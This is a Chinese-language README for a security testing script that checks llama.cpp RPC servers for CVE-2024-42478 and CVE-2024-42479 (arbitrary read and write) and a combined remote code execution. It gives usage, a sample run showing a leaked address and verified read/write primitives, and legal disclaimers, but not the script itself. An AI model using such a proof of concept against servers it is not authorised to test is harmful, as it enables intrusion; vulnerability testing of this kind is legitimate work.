# LLAMA.cpp 安全测试工具


## 简介：
该工具旨在测试目标程序 `llama.cpp` 的 RPC 服务器是否存在 CVE-2024-42479、CVE-2024-42478 及组合漏洞 RCE。
  - CVE-2024-42479：攻击者可以利用该漏洞实现任意地址写入
  - CVE-2024-42478：攻击者可以利用该漏洞实现任意地址读取
  - 组合漏洞 RCE：攻击者可以实现执行任意命令，控制靶机设备


## 适用环境：
- 适用于 Ubuntu 22.04


## 安装：
确保您的环境中已安装 Python 3 和 `pwntools` 库。可以使用以下命令安装 `pwntools`：

```bash
pip install -i https://pypi.tuna.tsinghua.edu.cn/simple pwntools
```


## 使用说明：
rce-poc-llama1.py 默认指定IP为127.0.0.1，端口50052
```bash
python3 rce-poc-llama1.py -i <target_ip> -p <target_port>
```


## 运行demo:
(llama_venv) yzj@ldd:~/桌面/python_venv$ python3 rce-poc-llama1.py

===========================
LLAMA.cpp框架安全测试程序
===========================

===========================
说明：本程序当前默认适用于 Ubuntu 22.04, 
用途：本程序主要针对CVE-2024-42479、CVE-2024-42478以及组合漏洞RCE进行安全测试 
法律声明：本程序仅用于CVE-2024-42479、CVE-2024-42478以及组合漏洞RCE的安全检测，不提供漏洞利用的能力，若用户利用该工具进行恶意操作，造成的损失，亚信安全一概不承担责任。
关于：由于 llama.cpp 框架运行的环境可能存在差异，最终的检测效果可能会受到影响。若存在问题，请加微信 monotony67
===========================
[+] Opening connection to 127.0.0.1 on port 50052: Done
[*] 程序初始化, 成功连接到服务器。
[*] 检测到泄露地址为： 0x5934a87d7630
[*] 检测到存在 CVE-2024-42478，该 CVE 可用于读取任意地址上的内容
[*] 验证：读取到 0x5934a87d7630 处的内容为 0x74dbec3896b0
[*] 检测到存在 CVE-2024-42479，该 CVE 可用于在任意地址上写入内容
[*] 验证：在0x5934a87d7630 处可以写入内容为 flag\x00
[*] 检测到目标程序存在 RCE 漏洞，请及时修复
[*] Closed connection to 127.0.0.1 port 50052



## 异常说明：
1. 出现错误：struct.error: unpack requires a buffer of 8 bytes
这种情况属于正常情况，再次执行，即可。

2. [!] 检测到公网 IP: 10.1.3.14，程序将退出。
检测程序仅支持内部网络，请勿用于公网，否则后果自负



## 法律声明：
该工具仅用于安全检测，不提供漏洞利用能力，用户在使用前请务必了解漏洞的详细信息，并遵守当地法律法规。
